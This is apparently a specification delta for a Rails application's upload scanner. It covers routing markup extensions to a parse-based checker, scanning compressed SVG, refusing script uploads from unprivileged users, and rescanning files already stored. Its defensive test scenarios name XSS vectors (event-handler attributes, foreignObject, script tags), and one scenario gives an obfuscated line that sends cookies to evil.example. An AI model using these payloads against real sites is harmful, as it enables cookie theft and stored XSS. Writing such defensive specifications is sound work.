## ADDED Requirements

### Requirement: Scan ruleset is selected by how the stored file will be rendered

The content scanner SHALL choose its ruleset from how a browser will parse the stored file, not
from a literal `.svg` comparison. An upload whose filename extension is one a browser parses as
markup SHALL be routed to the parse-based markup checker (`svg-upload-sanitization`); every other
upload SHALL be scanned by the generic pattern ruleset.

The markup extensions SHALL be `svg`, `svgz`, `svg.gz`, `html`, `htm`, `xhtml`, `xht`, `shtml`,
`xml`, `xsl` and `xslt`. Matching SHALL be case-insensitive, and a filename whose basename is
exactly one of these extensions with no stem (a dotfile, which reports no extension) SHALL be
treated as markup as well, so routing fails closed.

The generic ruleset remains in force for non-markup uploads as defense-in-depth. It SHALL NOT be
the only control for any content a browser parses as markup.

#### Scenario: The same payload is refused under every markup extension
- **WHEN** content carrying an `onpointerdown` attribute is scanned as `x.svg`, `x.svgz`, `x.html`, `x.htm`, `x.xhtml` and `x.xml`
- **THEN** every one of them is reported unsafe

#### Scenario: An uppercase markup extension is routed to the markup checker
- **WHEN** `content_unsafe?` is called with a filename ending in `.HTML` or `.SVG`
- **THEN** the content is evaluated by the parse-based markup checker, not the generic pattern scan

#### Scenario: A bare markup dotfile name keeps markup routing
- **WHEN** `content_unsafe?` is called with a filename whose basename is exactly `.svg` or `.html`, in any case
- **THEN** the content is evaluated by the parse-based markup checker

#### Scenario: A markup-only vector is rejected regardless of extension case
- **WHEN** markup carrying a `foreignObject` element is scanned as `image.svg` and as `image.SVG`
- **THEN** both are rejected as unsafe

#### Scenario: A non-markup upload keeps the generic ruleset
- **WHEN** a `.txt` file whose text contains `if a<b and on=1 then x` is scanned
- **THEN** it is not routed to the markup checker and is accepted, because a `.txt` is not served as markup

### Requirement: Compressed markup is decompressed before scanning

The system SHALL decompress gzip-compressed markup uploads and scan the decompressed bytes, because
compressed content is opaque to every detection rule and would otherwise pass unexamined.

Decompression SHALL be bounded by a maximum decompressed size. An upload that exceeds the bound
SHALL be refused rather than decompressed further, so a compression bomb cannot exhaust memory.

An upload carrying a compressed-markup extension whose bytes are not valid gzip SHALL be scanned as
raw markup rather than skipped, because a web server may serve those bytes as markup regardless of
the name suggesting compression.

#### Scenario: A hostile compressed SVG is rejected
- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG containing an `onpointerdown` attribute
- **THEN** the upload is refused with `Potentially malicious content found!` and no file is persisted

#### Scenario: A clean compressed SVG is accepted
- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG with no dangerous elements, attributes or URIs
- **THEN** the upload is stored normally

#### Scenario: A compression bomb is refused rather than expanded
- **WHEN** a user uploads a `.svgz` whose payload would decompress beyond the maximum decompressed size
- **THEN** the upload is refused and decompression stops at the bound

#### Scenario: Uncompressed bytes under a compressed extension are still scanned
- **WHEN** a user uploads a `.svgz` whose bytes are plain, ungzipped SVG containing an `onclick` attribute
- **THEN** the upload is refused, because the bytes are scanned as raw markup

### Requirement: Executable script uploads require the unfiltered-upload permission

The system SHALL refuse uploads whose filename extension is an executable script type from any user
who does not hold `media_unfiltered_upload`. The script extensions SHALL be `js`, `mjs`, `cjs`,
`wasm` and `swf`. Matching SHALL be case-insensitive and SHALL apply the same fail-closed dotfile
handling as markup routing.

The refusal is an authorization decision, not a scan result. Script content cannot be meaningfully
scanned: JavaScript has no safe subset and every dangerous capability is reachable through dynamic
construction, so a name-based rule is defeated by trivial obfuscation. A scanner that cannot reach a
verdict fails closed.

Users holding `media_unfiltered_upload` SHALL be unaffected, since that permission already skips
scanning entirely and therefore already permits these uploads.

#### Scenario: An untrusted user cannot upload JavaScript
- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file
- **THEN** the upload is refused and no file is persisted

#### Scenario: Obfuscation does not change the outcome
- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file containing `window['fet'+'ch']('//evil.example/'+document['coo'+'kie'])`
- **THEN** the upload is refused, because the refusal is by extension and not by content inspection

#### Scenario: Module and WebAssembly extensions are covered
- **WHEN** a user without `media_unfiltered_upload` uploads a `.mjs`, `.cjs` or `.wasm` file
- **THEN** the upload is refused

#### Scenario: A permitted user may still upload script
- **WHEN** a user holding `media_unfiltered_upload` uploads a `.js` file
- **THEN** the upload is stored normally

#### Scenario: A script upload outside a request context is refused
- **WHEN** a `.js` upload is attempted with no current request user or no current site
- **THEN** the upload is refused, matching the fail-closed permission behavior for scanning

### Requirement: Already-stored uploads can be re-examined against the current rules

The system SHALL provide a report-only task that scans files already stored under the media root and
reports those the current rules would refuse. The new rules apply at upload time, so files stored
before this change are never otherwise re-examined.

The task SHALL NOT delete, move, quarantine or rewrite any file. Its output SHALL identify each
finding by site and path, and SHALL state the rule that would refuse it, so an operator can decide
what to do.

#### Scenario: A stored hostile markup file is reported
- **WHEN** the task runs over a media root containing an `.html` file with an `onpointerdown` attribute
- **THEN** the file is listed in the report with the rule that would refuse it

#### Scenario: A stored script file is reported
- **WHEN** the task runs over a media root containing a `.js` file
- **THEN** the file is listed in the report as a script type that untrusted users may no longer upload

#### Scenario: The task never modifies stored content
- **WHEN** the task completes over a media root containing files it reports
- **THEN** every reported file remains present and byte-identical

#### Scenario: A clean media root reports nothing
- **WHEN** the task runs over a media root whose files all pass the current rules
- **THEN** the report is empty and the task exits successfully

## MODIFIED Requirements

### Requirement: Content is scanned before being written to a web-served path

The system SHALL scan upload content for malicious patterns before writing it into the upload staging directory, so that rejected content is never present — even transiently — at a path served by the web server.

Whether the scan runs is decided by authorization, not by the location of the source file. An upload SHALL be scanned unless the uploading user holds the `media_unfiltered_upload` permission. For a user without it every upload is scanned, whatever the source — a `data:` payload, a remote download, a private-media file, or a file already published under `Rails.public_path`. The previous exemption for sources already under the public root is withdrawn: it was keyed on the source path while the scan ruleset and the served `Content-Type` are keyed on the caller-supplied output filename, so a source accepted under one extension could be rewritten to another and served as live markup without being re-scanned.

Scanning rejects; it never repairs. Content that trips a rule SHALL be refused with `Potentially malicious content found!` rather than sanitized, escaped or rewritten.

#### Scenario: data: payload is scanned before staging
- **WHEN** a `crop_url` upload supplies a `data:` URI whose decoded payload contains a `<script>` tag
- **THEN** the payload is rejected without any file being created under `public/tmp/{site_id}/`

#### Scenario: Downloaded remote body is scanned before staging
- **WHEN** a remote URL upload returns a body containing an event-handler attribute
- **THEN** the body is rejected without being written into `public/tmp/{site_id}/`

#### Scenario: Hostile payload is never retrievable from the staging path
- **WHEN** a media-permission user posts a `crop_url` upload named `x.html` whose `data:` payload contains `<script>`
- **THEN** no file is ever created at `public/tmp/{site_id}/x.html`, so a concurrent request for `/tmp/{site_id}/x.html` cannot retrieve the payload at any point

#### Scenario: An already-published file can be re-cropped
- **WHEN** a user without `media_unfiltered_upload` uses a file already stored under `Rails.public_path` as the source of a crop
- **THEN** the crop proceeds, with the content scan running against the source and the output filename selecting the ruleset — the exemption that previously skipped it no longer applies

#### Scenario: Re-crop under a different extension cannot bypass the ruleset
- **WHEN** a user without `media_unfiltered_upload` uploads an SVG that the markup ruleset accepts, then re-crops it supplying an output name ending in `.html`
- **THEN** the re-crop is scanned under the markup ruleset selected by the output name and rejected if it carries anything that ruleset refuses, so the bytes are never served as live `text/html`

#### Scenario: A private-media source is still scanned
- **WHEN** a file outside the public root (for example under the private-media directory) is used as an upload source
- **THEN** the content scan runs as before

#### Scenario: A permitted user uploads without scanning
- **WHEN** a user holding `media_unfiltered_upload` uploads a file whose content matches a blocked pattern
- **THEN** the upload is accepted, because the permission exempts the uploader from scanning

#### Scenario: Scanning is skipped without reading the file for a permitted user
- **WHEN** the permission check answers true
- **THEN** the content scan is not performed, so the file is not read in order to scan it

### Requirement: Reject uploaded files with event handler attributes

The system SHALL reject file uploads whose content contains executable event handler attributes before storing or persisting the file. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.

**Change**: markup uploads — every extension a browser parses as markup, not only `.svg` — are scanned for event handlers by the parse-based checker in the `svg-upload-sanitization` capability, which rejects any attribute whose name begins with `on` by shape rather than by matching a list of handler names. The regex denylist no longer decides event handlers for any content a browser parses as markup; it continues to apply to non-markup uploads as defense-in-depth, where its incompleteness cannot produce a stored-XSS path.

#### Scenario: A markup file with an unlisted handler is rejected
- **WHEN** a user uploads an `.html` file whose content includes an `onpointerdown`, `ontouchstart`, `onauxclick` or `onemptied` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: A markup file with a listed handler is still rejected
- **WHEN** a user uploads an `.html` file whose content includes an `onclick` or `onload` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Non-SVG file with onclick is rejected
- **WHEN** a user uploads a non-SVG file whose content includes an `onclick` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Non-SVG file with onload is rejected
- **WHEN** a user uploads a non-SVG file whose content includes an `onload` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: SVG with event handlers is rejected (not scanned by regex)
- **WHEN** a user uploads an SVG file containing event handler attributes
- **THEN** the system rejects the upload via the parse-based checker (see `svg-upload-sanitization`)

#### Scenario: Rejected file is absent from the staging directory
- **WHEN** an upload is rejected for containing an event-handler attribute
- **THEN** no file for that upload remains under `public/tmp/{site_id}/`

## REMOVED Requirements

### Requirement: SVG detection at scan time is case-insensitive

**Reason**: Superseded by "Scan ruleset is selected by how the stored file will be rendered", which
keeps every behavior this requirement specified (case-insensitive matching, fail-closed dotfile
routing, and the guarantee that SVG-only vectors cannot reach the weaker ruleset) and extends them
from `.svg` alone to every extension a browser parses as markup.

**Migration**: None. No behavior is withdrawn; the replacement requirement is strictly broader, and
its scenarios cover the SVG cases this one specified.
